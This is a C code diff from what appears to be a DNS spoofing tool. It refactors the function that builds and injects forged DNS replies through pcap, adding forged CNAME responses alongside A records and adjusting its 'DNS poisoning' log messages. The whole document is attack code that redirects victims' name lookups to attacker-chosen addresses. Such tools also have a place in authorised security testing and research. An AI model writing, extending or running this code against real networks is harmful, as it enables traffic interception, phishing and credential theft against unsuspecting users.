@@ -15,7 +15,7 @@
 extern PHOSTNODE gDnsSpoofingList;
 
 
-BOOL DnsResponseSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, char *spoofedIp, char *srcIp, char *dstIp, char *hostName)
+BOOL DnsResponseSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PHOSTNODE spoofingRecord, char *srcIp, char *dstIp)
 {
   BOOL retVal = FALSE;
   unsigned char *spoofedDnsResponse = NULL;
@@ -25,7 +25,17 @@ BOOL DnsResponseSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, char *
   int counter = 0;
   char errbuf[PCAP_ERRBUF_SIZE];
 
-  if ((responseData = CreateDnsResponse_A(hostName, dnsBasicHdr->id, spoofedIp)) == NULL)
+  // Create DNS response data block
+  if (spoofingRecord->Data.Type == RESP_A)
+  {
+    responseData = CreateDnsResponse_A(spoofingRecord->Data.HostName, dnsBasicHdr->id, spoofingRecord->Data.SpoofedIp);
+  }
+  else if (spoofingRecord->Data.Type == RESP_CNAME)
+  {
+    responseData = CreateDnsResponse_CNAME(spoofingRecord->Data.HostName, dnsBasicHdr->id, spoofingRecord->Data.CnameHost, spoofingRecord->Data.SpoofedIp);
+  }
+
+  if (responseData == NULL)
   {
     retVal = FALSE;
     goto END;
@@ -49,13 +59,12 @@ BOOL DnsResponseSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, char *
     int funcRetVal = -2;
     if ((funcRetVal = pcap_sendpacket(deviceHandle, (unsigned char *)spoofedDnsResponse, basePacketSize + responseData->dataLength)) != 0)
     {
-      LogMsg(DBG_ERROR, "%2d Response DNS poisoning failed (%d) : %s -> %s, deviceHandle=0x%08x",
-        counter, funcRetVal, hostName, spoofedIp, deviceHandle);
+      LogMsg(DBG_HIGH, "%2d Response DNS poisoning failed (%d) : %s -> %s, deviceHandle=0x%08x",
+        counter, funcRetVal, spoofingRecord->Data.HostName, spoofingRecord->Data.SpoofedIp, deviceHandle);
       retVal = FALSE;
     }
     else
     {
-      LogMsg(DBG_INFO, "Response DNS pisoning succeeded : %s -> %s", hostName, spoofedIp);
       retVal = TRUE;
       break;
     }
